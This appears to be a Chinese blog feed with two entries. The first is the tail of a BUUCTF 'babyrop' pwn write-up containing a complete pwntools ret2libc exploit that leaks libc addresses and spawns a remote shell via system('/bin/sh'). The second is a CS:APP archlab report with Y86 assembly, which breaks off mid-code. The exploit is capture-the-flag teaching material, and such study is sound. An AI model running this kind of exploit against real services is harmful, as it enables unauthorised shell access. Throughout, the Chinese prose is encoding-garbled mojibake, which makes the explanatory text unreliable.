class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å…ˆå»ç®—<code>libc</code>çš„åŸºå€ï¼Œåæ¨å‡º<code>system()</code>çš„åœ°å€ã€‚</p><p><code>libc.sym[&#39;read&#39;]</code>ä¼šè¿”å›<code>read()</code>åœ¨<code>libc</code>é‡Œé¢çš„åç§»ï¼Œæ³„éœ²å‡º<code>read()</code>çš„çœŸå®åœ°å€å°±å¯ä»¥ç®—å‡º<code>libc</code>çš„çœŸå®åŸºå€äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#æ‹¿åˆ°çœŸå®åœ°å€</span></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#æ‹¿åˆ°çœŸå®åŸºå€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base_addr: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>è°ƒè¯•æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><img src="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png" alt="buuctf _OGeek2019_babyrop_3.png"></p><p>32ä½ç¨‹åº<code>libc</code>å‡½æ•°éƒ½æ˜¯<code>0xf7</code>å¼€å¤´çš„ï¼Œ<code>libc</code>åŠ è½½çš„æ—¶å€™ä¼šå†…å­˜ä¹Ÿå¯¹é½ï¼Œæ‰€ä»¥æœ«ä¸‰ä½ä¸€å®šæ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™å°±å¾—åˆ°äº†<code>libc</code>çš„çœŸå®åœ°å€ã€‚ä¸‹é¢ä¸¤æ­¥å°±æŠŠ<code>system()</code>å’Œ<code>/bin/sh</code>ç®—å‡ºæ¥å°±å¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºå¥½åƒå¹¶ä¸èƒ½ç›´æ¥æ‹¿åˆ°è¿™ä¸ªåç§»ï¼Œä½†æ˜¯å¯ä»¥åœ¨<code>gdb</code>é‡Œé¢è°ƒè¯•å¾—åˆ°<code>system()</code>ç›¸å¯¹<code>/bin/sh</code>çš„åç§»ï¼Œä¹Ÿå¯ä»¥å‰é¢<code>IDA</code>æŸ¥çœ‹ç›´æ¥è·å–åç§»ï¼Œå‰é¢çš„é‚£äº›åœ°å€å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„åç§»ï¼Œå¯ä»¥ç›´æ¥ç”¨ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬é€‰æ‹©éš¾ä¸€ç‚¹çš„è·¯çº¿ï¼Œå°±æ€•å“ªæ¬¡ç»™ä½ ç›´æ¥æ–­äº†é‚£æ¡ç®€å•è·¯çº¿ï¼Œå®ƒä¸å¯èƒ½æ–­ä½ éš¾çš„è·¯çº¿ç•™ä¸€ä¸ªç®€å•çš„è·¯çº¿å§ã€‚</p><h3 id="ç¬¬äºŒæ¬¡æº¢å‡ºç›´æ¥æ‰§è¡Œsystem-â€œ-bin-shâ€"><a href="#ç¬¬äºŒæ¬¡æº¢å‡ºç›´æ¥æ‰§è¡Œsystem-â€œ-bin-shâ€" class="headerlink" title="ç¬¬äºŒæ¬¡æº¢å‡ºç›´æ¥æ‰§è¡Œsystem(â€œ/bin/shâ€)"></a>ç¬¬äºŒæ¬¡æº¢å‡ºç›´æ¥æ‰§è¡Œsystem(â€œ/bin/shâ€)</h3><p>è¿™ä¸ªpayloadå°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸€å®šæ³¨æ„å‰é¢çš„<code>payload1</code>ä¹Ÿè¦å†<code>send</code>ä¸€æ¬¡ï¼Œä¸ç„¶æ‰§è¡Œä¸åˆ°è¿™é‡Œçš„ï¼Œæˆ‘å°±è¿™é‡Œå¡äº†å¾ˆä¹…ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,xxx)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;[+]read_addr: &#x27;,hex(read_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]libc_base_addr: &#x27;,hex(libc_base))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]system_addr: &#x27;,hex(system_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]bin_sh: &#x27;,hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)<span class="comment">#ä¸€å®šè¦å†ç»™ä¸€æ¬¡</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>archlabå®éªŒæŠ¥å‘Šï¼šy86å‘½ä»¤ä½¿ç”¨</title>
      <link href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹è½½æ–‡ä»¶ä¹‹åï¼š</p><p>è„‘ç“œå­å—¡å—¡çš„ï¼Œ<code>writeup</code>çœ‹ä¸æ‡‚ï¼Œåªèƒ½å…ˆå»çœ‹çœ‹å·²æœ‰çš„å®éªŒæŠ¥å‘Šï¼Œç„¶åå…ˆåšä¸ªæ€»ç»“â€”â€”</p><p>å…ˆæŠŠé‡Œé¢çš„<code>sim.tar</code>è§£å‹äº†ï¼Œç„¶åè¿›å…¥ç›®å½•ä¹‹å<code>make clean</code>ï¼Œ<code>make</code>ä¼šåœ¨é‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶è¯¥ç”Ÿæˆçš„æ–‡ä»¶ç”Ÿæˆäº†ã€‚</p><span id="more"></span><h1 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h1><p>è¿™ä¸ªéƒ¨åˆ†çš„æ–‡ä»¶å…¨åœ¨<code>misc</code>æ–‡ä»¶å¤¹ã€‚</p><p>æ„æ€å¤§æ¦‚æ˜¯ç”¨<code>y86</code>æŒ‡ä»¤é›†å®ç°<code>example.c</code>æ–‡ä»¶é‡Œé¢çš„ä¸‰ä¸ªå‡½æ•°ï¼Œé‚£ä¹Ÿå¤ªæ£’äº†å‘€ï¼Œæˆ‘æœ€æ“…é•¿æ‰‹å†™æ±‡ç¼–äº†ï¼Œæ±‡ç¼–å®ƒè™½ç„¶ç èµ·æ¥æ•ˆç‡ä½ï¼Œä½†æ˜¯èƒ½ç›´æ¥å¯¹åº•å±‚è¿›è¡Œæ“ä½œï¼Œæƒ³æƒ³éƒ½æ¿€åŠ¨<code>awa</code></p><p>è¦ç”¨åˆ°çš„æŒ‡ä»¤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./yis xxx.ys  </span><br><span class="line">./yas xxx.yo</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å¯ä»¥ç†è§£ä¸ºæ±‡ç¼–ï¼Œç¬¬äºŒæ¡å¯ä»¥ç†è§£ä¸ºé“¾æ¥ä¸”è¿è¡Œã€‚</p><h2 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sum_list</span><span class="params">(list_ptr ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">        val += ls-&gt;val;</span><br><span class="line">        ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªå¾ˆæœ´ç´ çš„é“¾è¡¨æ±‚å’Œï¼Œç”¨å¾ªç¯å®ç°ã€‚ä¹¦ä¸Šæœ‰ä¾‹å­çš„ï¼Œé‚£å°±ç›´æ¥æŠŠä»£ç å†™ä¸‹æ¥å§ï¼Œæ³¨é‡Šä¸Šå†™çš„æŒºæ¸…æ™°äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#åˆå§‹åŒ–</span><br><span class="line">    irmovq stack,%rsp#åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§</span><br><span class="line">    call main#æ‰§è¡Œä¸»å‡½æ•°</span><br><span class="line">    halt#ç»“æŸ</span><br><span class="line">    .align 8#å¯¹é½</span><br><span class="line">ele1:#é“¾è¡¨å¤´</span><br><span class="line">    .quad 0x00a#é“¾è¡¨å€¼1</span><br><span class="line">    .quad ele2#è¿æ¥ä¸‹ä¸€ä¸ªè¡¨</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#é“¾è¡¨å€¼2</span><br><span class="line">    .quad ele3#è¿æ¥ä¸‹ä¸€ä¸ªè¡¨</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#é“¾è¡¨å€¼3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#ä¼ å‚</span><br><span class="line">    call sum_list#è°ƒç”¨å‡½æ•°</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r14</span><br><span class="line">        irmovq $0,%rax</span><br><span class="line">L2:</span><br><span class="line">        subq %r14,%rdi</span><br><span class="line">        je L4#åˆ°äº†NULLè·³è½¬L4è¿”å›</span><br><span class="line">        mrmovq (%rdi),%r13#å–å€¼</span><br><span class="line">        addq %r13,%rax#åŠ ç»™axå¯„å­˜å™¨</span><br><span class="line">        mrmovq 8(%rdi),%rdi#ä¸‹ä¸€ä¸ªåœ°å€ç»™%rdi</span><br><span class="line">        jmp     L2</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ:</p><p><img src="https://i.loli.net/2021/05/10/xhO3Tjqgw9EGBVa.png" alt="archlab_PartA_1.png"></p><p><code>while</code>å®ç°æ–¹å¼æœ‰å¤šç§ï¼Œä¸‹é¢å‡ ç§éƒ½å¯ä»¥ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //å¾ªç¯å—</span><br><span class="line">    jnz L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    jz L4</span><br><span class="line">    //å¾ªç¯å—</span><br><span class="line">    jmp L2</span><br><span class="line">L4:</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>â€¦â€¦æ¥ä¸‹æ¥è¯»è€…è‡ªå·±æƒ³è±¡å§</p><h2 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h2><p>è¿™ä¸€æ¬¡ä¹Ÿæ˜¯è¦ä¸€ä¸ªé“¾è¡¨æ±‚å’Œï¼Œåªæ˜¯å‡½æ•°éœ€è¦é€’å½’ã€‚</p><p>é‚£ä¹ˆè¿™æ¬¡æˆ‘ä»¬ç¨å¾®æ”¹ä¸€ä¸‹ï¼ŒæŠŠè·³è½¬åˆ°<code>L2</code>æ”¹æˆé‡æ–°<code>call</code>ä¸€æ¬¡å°±å¥½äº†å‘—ï¼Œè¿™é‡Œä¸è¿‡å¤šè§£é‡Šäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#åˆå§‹åŒ–</span><br><span class="line">    irmovq stack,%rsp#åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§</span><br><span class="line">    call main#æ‰§è¡Œä¸»å‡½æ•°</span><br><span class="line">    halt#ç»“æŸ</span><br><span class="line">    .align 8#å¯¹é½</span><br><span class="line">ele1:#é“¾è¡¨å¤´</span><br><span class="line">    .quad 0x00a#é“¾è¡¨å€¼1</span><br><span class="line">    .quad ele2#è¿æ¥ä¸‹ä¸€ä¸ªè¡¨</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#é“¾è¡¨å€¼2</span><br><span class="line">    .quad ele3#è¿æ¥ä¸‹ä¸€ä¸ªè¡¨</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#é“¾è¡¨å€¼3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#ä¼ å‚</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    call sum_list#è°ƒç”¨å‡½æ•°</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r13</span><br><span class="line">        subq %r13,%rdi</span><br><span class="line">        je L4#åˆ°äº†NULLè·³è½¬L4è¿”å›</span><br><span class="line">        mrmovq (%rdi),%r13#å–å€¼</span><br><span class="line">        addq %r13,%rax#åŠ ç»™axå¯„å­˜å™¨</span><br><span class="line">        mrmovq 8(%rdi),%rdi#ä¸‹ä¸€ä¸ªåœ°å€ç»™%rdi</span><br><span class="line">        call sum_list#é€’å½’è°ƒç”¨</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x400</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘è¿™ä¸ªåšæ³•åœ¨ç¼–è¯‘åº”è¯¥æ˜¯ä¸å­˜åœ¨çš„ï¼ŒçœŸæ­£é€’å½’çš„è¯æ¯æ¬¡è°ƒç”¨éƒ½åº”è¯¥ç”¨<code>rax</code>ä¿å­˜è¿”å›å€¼çš„ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç›´æ¥å†™æ±‡ç¼–æŒ‡ä»¤çš„ï¼Œæ‰€ä»¥ä¸å¿…é‚£ä¹ˆéº»çƒ¦(å…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“ç¬¦ä¸ç¬¦åˆè¦æ±‚ï¼Œåæ­£èƒ½è¿‡çš„ç¨‹åº)</p><p>è´´ä¸€ä¸ªè¿è¡Œç»“æœå§:</p><p><img src="https://i.loli.net/2021/05/11/PWqVTabiOsw6zgj.png" alt="archlab_PartA_2.png"></p><p>(PS:å°±æ„Ÿè§‰è¿™ä¸ª<code>lab</code>æˆ‘å†™çš„æŒºæ°´çš„ï¼Œåˆ†æçš„ä¸œè¥¿æ¯”è¾ƒå°‘ï¼Œå¯èƒ½è¿˜æ˜¯æˆ‘èœå§<code>qwq</code>)</p><h2 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">copy_block</span><span class="params">(<span class="keyword">long</span> *src, <span class="keyword">long</span> *dest, <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> val = *src++;</span><br><span class="line">        *dest++ = val;</span><br><span class="line">        result ^= val;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç¬¬ä¸‰ä¸ªå‡½æ•°è·Ÿé“¾è¡¨å…³ç³»ä¸å¤§äº†ï¼Œç»™å‡ºæºåœ°å€å’Œç›®çš„åœ°å€ï¼Œæºåœ°å€ä¿å­˜äº†ä¸€äº›å€¼ï¼Œè¦å°†æºåœ°å€å¼€å§‹çš„<code>len</code>é•¿åº¦çš„æ•°æ®æ‹·è´åˆ°ç›®çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠæ‹·è´çš„å€¼å¼‚æˆ–èµ·æ¥å¹¶ä¸”è¿”å›ã€‚é¦–å…ˆ<code>len</code>ä¸ºå¾ªç¯æ¬¡æ•°æ²¡å¾—è·‘ï¼Œé‚£ä¹ˆå°±å…ˆå¯ä»¥æ„å»ºå‡ºå®ƒå¾ªç¯çš„åŸºæœ¬æ¡†æ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //â€¦â€¦</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    subq %r9,%rdx</span><br><span class="line">    jne L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>ç„¶åç•¥å»çš„å†…å®¹æ— éå°±æ˜¯èµ‹å€¼ï¼Œå¼‚æˆ–ï¼Œç„¶åå°±å®Œäº†â€¦æœ€åæ³¨æ„ä¸€ä¸‹åœ¨mainå‡½æ•°æŠŠä¸‰ä¸ªå‚æ•°ä¼ å¥½ï¼Œ64ä½çš„ç¨‹åºå‰å…­ä¸ªå‚æ•°ä¾æ¬¡ç»™<code>rdi,rsi,rdx,rcx,r8,r9</code>å¯„å­˜å™¨ï¼Œé‚£ä¹ˆmainå‡½æ•°å°±åº”è¯¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    irmovq src,%rdi</span><br><span class="line">    irmovq dest,%rsi</span><br><span class="line">    irmovq xxx,%rdx//è¿™é‡Œçš„xxxè‡ªå·±å†™ï¼Œå†™äº†å¤šé•¿çš„æ•°æ®ç»™å¤šå°‘æ•°å€¼</span><br><span class="line">    call copy</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè‡ªå·±å†éšä¾¿å–ä¸€ä¸‹<code>dest</code>å’Œ<code>src</code>æ±‡ç¼–è¿è¡Œåå°±å¯ä»¥çœ‹åˆ°ç»“æœã€‚</p><p>å®Œæ•´ä»£ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#åˆå§‹åŒ–</span><br><span class="line">    irmovq stack,%rsp#åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§</span><br><span class="line">    call main#æ‰§è¡Œä¸»å‡½æ•°</span><br><span class="line">    halt#ç»“æŸ</span><br><span class="line">    .align 8#å¯¹é½</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">        irmovq src,%rdi</span><br><span class="line">        irmovq dest,%rsi</span><br><span class="line">    irmovq $3,%rdx#argument len</span><br><span class="line">    call copy</span><br><span class="line">    ret </span><br><span class="line">copy:</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    irmovq $8,%r10</span><br><span class="line">L1:</span><br><span class="line">        mrmovq (%rdi),%r8</span><br><span class="line">        xorq %r8,%rax</span><br><span class="line">        rmmovq %r8,(%rsi)</span><br><span class="line">        addq %r10,%rdi</span><br><span class="line">        addq %r10,%rsi</span><br><span class="line">        subq %r9,%rdx</span><br><span class="line">        jne L1</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœæˆ‘ä»¬å…·ä½“å…³æ³¨ä¸€ä¸‹<code>111,222,333</code>å†…å­˜é‡Œé¢çš„å€¼æœ‰æ²¡æœ‰åˆ†åˆ«è¢«ä¿®æ”¹ä¸ºå¯¹åº”å€¼ä»¥åŠè¿”å›çš„å¼‚æˆ–å€¼æ˜¯å¦ä¸è‡ªå·±è®¡ç®—çš„æ˜¯å¦ç›¸ç­‰å°±è¡Œäº†</p><p><img src="https://i.loli.net/2021/05/11/DOyk6t2KHBoQCpj.png" alt="archlab_PartA_3.png"></p><p>è¿™æ ·çš„è¯<code>Part A</code>å°±æ’’èŠ±å•¦</p><h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><p>æµ‹è¯„æ–¹å¼:åœ¨<code>ptest</code>ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚</p><p><code>make SIM=../seq/ssim</code></p><p>è¿™ä¸ª<code>Part B</code>å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨<code>hcl</code>æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæŒ‡ä»¤<code>iaddq</code>ï¼Œè¿™ä¸ªå’±ä»¬ç…§æœ¬å®£ç§‘åœ¨seq-full.hclæ–‡ä»¶å¯¹åº”ä½ç½®åŠ ä¸Šè¿™ä¸ªæŒ‡ä»¤çš„åç§°å°±è¡Œäº†ï¼Œæœ€åæ–‡ä»¶ä¿®æ”¹æˆè¿™ä¸ªæ ·å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 